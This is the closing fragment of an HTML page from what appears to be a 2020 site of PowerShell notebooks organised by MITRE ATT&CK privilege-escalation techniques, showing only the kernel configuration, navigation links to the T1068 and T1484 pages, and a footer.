        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: ".net-powershell"
        },
        kernelOptions: {
            kernelName: ".net-powershell",
            path: "./tactics/privilege-escalation"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = '.net-powershell'</script>

              </div>
              
        </div>
    </div>
    
    
    <div class='prev-next-bottom'>
        
    <a class='left-prev' id="prev-link" href="T1068.html" title="previous page">T1068 - Exploitation for Privilege Escalation</a>
    <a class='right-next' id="next-link" href="T1484.html" title="next page">T1484 - Group Policy Modification</a>

    </div>
    <footer class="footer mt-5 mt-md-0">
    <div class="container">
      <p>
        
          By Hare Sudhan Muthusamy<br/>
        
            &copy; Copyright 2020.<br/>
      </p>
    </div>
  </footer>
</main>


      </div>
    </div>

    <script src="../../_static/js/index.js"></script>
    
  </body>
</html>